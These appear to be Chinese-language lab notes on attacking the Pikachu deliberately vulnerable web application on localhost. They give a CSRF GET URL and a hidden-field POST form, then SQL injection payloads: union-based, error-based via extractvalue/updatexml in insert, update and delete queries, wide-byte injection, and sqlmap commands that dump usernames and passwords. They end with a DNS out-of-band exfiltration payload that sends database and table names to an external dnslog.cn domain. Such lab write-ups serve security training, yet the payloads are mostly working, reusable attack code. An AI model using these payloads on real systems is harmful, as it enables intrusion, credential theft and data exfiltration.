# pikach-csrf

## get

GET /vul/csrf/csrfget/csrf_get_edit.php?sex=girl&phonenum=111&add=usa&email=lili%40qqq.com&submit=submit

因为目标网站没有进行csrf防御，无法分辨用户的数据包来源

--------------

## post

```html
<form method="POST" action="http://127.0.0.1/vul/csrf/csrfpost/csrf_post_edit.php">
    <input type="hidden" name="sex" value="boy"/>
    <input type="hidden" name="phonenum" value="999999"/>
    <input type="hidden" name="add" value="china"/>
    <input type="hidden" name="email" value="abc@qq.com"/>
    <input type="submit" name="submit" value="恭喜你"/>
</form>
```




---------------

## pikach-sql

### 1，2

### 3

搜索

```sql
select * from table1 where username like '% x %';

?name=l%' union select 1,2,database() --+
```

### 4

### 5

注册：

```sql
'123'),'','','','')' at line 1

insert into table1(username,password,sex,phonenum,email,add)values('用户名','密码','性别','电话','email','地址  ')


insert into table1(username,password,sex,phonenum,email,add)values('用户名','密码','性别','电话','email','1' and extractvalue(1,concat(0x7e,database()))) # ')
```

在用户名和密码以外的地方填写1，2，3，4，然后加\让他报错测算几号位是最后一位

修改：

```sql
update table1 set sex='x',phonenum='x',,address='x',email='x' where username='用户名'

在sex地方\
2',address='3',email='4' where username='zj1'

update table1 set sex='x',phonenum='x',,address='x',email=' x' and updatexml(1,concat(0x7e,database()),1) #  ' where username='用户名'
```

### 6

```sql
delete * from users where id=x

http://127.0.0.1/vul/sqli/sqli_del.php?id=72 and updatexml(1,concat(0x7e,database()),1) --+
```

### 7

```sql
insert into table1(useragent,yuyan,duankou) values('浏览器','语言','端口')


'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','50485')' 

insert into table1(useragent,yuyan,duankou) values('浏览器 1' and updatexml(1,concat(0x7e,database()),1) and '  ','语言','端口')
```

### 8-9

sqlmap.exe （免python环境)直接打开用

python sqlmap.py xxxxxxxx
python2.7 sqlmap.py xxxxxx
python3 sqlmap.py xxxxxxx

### linux

```sql
sqlmap -u xxxxxxx

Sqlmap -u "http://127.0.0.1/vul/sqli/sqli_blind_b.php?name=lili&submit=%67e5%8be2" --dbs -p name --batch --threads 10

Sqlmap -u "http://127.0.0.1/vul/sqli/sqli_blind_b.php?name=lili&submit=%67e5%8be2"  -p name -D pikachu --tables --batch --threads 10

Sqlmap -u "http://127.0.0.1/vul/sqli/sqli_blind_b.php?name=lili&submit=%67e5%8be2"  -p name -D pikachu -T users --columns --batch --threads 10

Sqlmap -u "http://127.0.0.1/vul/sqli/sqli_blind_b.php?name=lili&submit=%67e5%8be2"  -p name -D pikachu -T users -C username,password --dump --batch --threads 10
```



### 10

POST
name=123%df' union select 1,2 #&submit=%E6%9F%A5%E8%AF%A2

---

盲注补充:
DNS注入
---
my.ini文件

找到
secure_file_priv=
如果找不到，就添加在mysqld的最后一行
重启mysql

http://dnslog.cn
获取一个域名

```sql
?id=1' and if((select load_file(concat('\\\\',(select database()),'.jftaso.dnslog.cn\\fffd'))),1,0) --+

?id=1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=0x70696b61636875 limit 0,1),'.jftaso.dnslog.cn\\fxxxfd'))),1,0) --+
```



把select database()的结果（pikachu）合着自己的域名.jftaso.dnslog.cn（pikachu.jftaso.dnslog.cn），使用load_file进行请求，请求信息就会被jftaso.dnslog.cn的dns服务器抓到

DNS查询原理
从右往左解析！！！！
pikachu.jftaso.dnslog.cn

===============
